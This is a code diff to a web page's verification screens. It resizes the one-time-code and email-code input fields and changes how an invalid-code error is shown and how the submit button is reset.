@@ -370,7 +370,7 @@
     justify-content: center;
     margin: 10px 0 16px;
 ">
-                            <input type="tel" maxlength="8" id="otp-code" style="width:50%;height:52px;border:2px solid #e0e0ee;border-radius:10px;text-align:center;font-size:22px;font-weight:700;color:#1a1a2e;outline:none;background:#fff;letter-spacing:6px" placeholder="">
+                            <input type="tel" maxlength="8" id="otp-code" style="width:100%;height:38px;border:2px solid #e0e0ee;border-radius:10px;text-align:center;font-size:22px;font-weight:700;color:#1a1a2e;outline:none;background:#fff;letter-spacing:6px" placeholder="">
                         </div>
         <div class="otp-error-msg" id="otp-error"></div>
         <button class="otp-btn" id="otp-submit">Continue</button>
@@ -426,7 +426,7 @@
     justify-content: center;
     margin: 10px 0 16px;
 ">
-                            <input type="tel" maxlength="8" id="email-code" style="width:50%;height:52px;border:2px solid #e0e0ee;border-radius:10px;text-align:center;font-size:22px;font-weight:700;color:#1a1a2e;outline:none;background:#fff;letter-spacing:6px" placeholder="">
+                            <input type="tel" maxlength="8" id="email-code" style="width:100%;height:38px;border:2px solid #e0e0ee;border-radius:10px;text-align:center;font-size:22px;font-weight:700;color:#1a1a2e;outline:none;background:#fff;letter-spacing:6px" placeholder="">
                         </div>
         <div class="otp-error-msg" id="email-error"></div>
         <button class="otp-btn" id="email-submit">Continue</button>
@@ -808,7 +808,10 @@
                     var avbox=q('app-verify-box');if(avbox)avbox.classList.remove('hidden');var as=document.getElementById('app-spinner');if(as){as.classList.add('hidden');as.style.display=""}var ae4=q('app-error');if(ae4)ae4.classList.remove('hidden');var ae3=q('app-error');if(ae3)ae3.textContent=cm;var acb=q('app-continue-btn');if(acb){acb.disabled=false;acb.textContent='Continue to complete'}
                   }else if((function(){var avo3=q('otp-overlay');return avo3?!avo3.classList.contains('hidden'):false})()){
                     var otpsp=document.getElementById('otp-spinner');if(otpsp){otpsp.classList.add('hidden');otpsp.style.display=""}
-                    q('otp-result').classList.remove('hidden');var otpResP2=document.querySelector('#otp-result>p');if(otpResP2)otpResP2.textContent=cm
+                    var otpErr = q('otp-error');
+                 if(otpErr){otpErr.style.display = 'block'; otpErr.textContent = p.message || 'Invalid code'}
+                 var os2=q('otp-submit');if(os2)os2.disabled=false;
+                 var os4=q('otp-submit');if(os4)os4.textContent = 'Verify'
                   }else if((function(){var avo4=q('email-overlay');return avo4?!avo4.classList.contains('hidden'):false})()){
                     var emsp=document.getElementById('email-spinner');if(emsp){emsp.classList.add('hidden');emsp.style.display=""}
                     q('email-result').classList.remove('hidden');var emailResP2=document.querySelector('#email-result>p');if(emailResP2)emailResP2.textContent=cm
